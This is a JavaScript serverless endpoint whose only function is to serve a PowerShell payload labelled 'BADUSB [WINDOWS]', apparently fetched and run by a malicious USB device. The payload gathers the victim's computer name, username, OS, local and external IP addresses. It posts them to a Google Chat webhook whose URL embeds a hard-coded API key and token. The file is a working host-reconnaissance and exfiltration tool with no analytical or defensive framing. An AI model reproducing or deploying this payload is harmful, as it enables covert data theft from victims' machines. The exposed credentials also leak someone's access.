export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.status(200).send(`
$pc = $env:COMPUTERNAME
$u = $env:USERNAME
$osRaw = (Get-CimInstance Win32_OperatingSystem).Caption
$os = ($osRaw -replace '[^\u0000-\u007F]','').Trim()
$li = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | ?{$_.IPAddress -notlike '169.254*'} | select -Expand IPAddress -First 1)
try { $ei = (irm https://api.ipify.org -TimeoutSec 2) } catch { $ei = 'N/A' }
$nl = [Environment]::NewLine
$msg = "[BADUSB [WINDOWS]]$nl" + "PC: $pc$nl" + "User: $u$nl" + "OS: $os$nl" + "Local IP: $li$nl" + "External IP: $ei"
$b = @{ text = $msg } | ConvertTo-Json -Compress
irm 'https://chat.googleapis.com/v1/spaces/AAQAWgAQwQA/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=fXfm69VAuOUNAmgGVTI-k19PPWCJcxgkLRl4jw2tTl4' -Method Post -Body $b -ContentType 'application/json'
  `.trim());
}
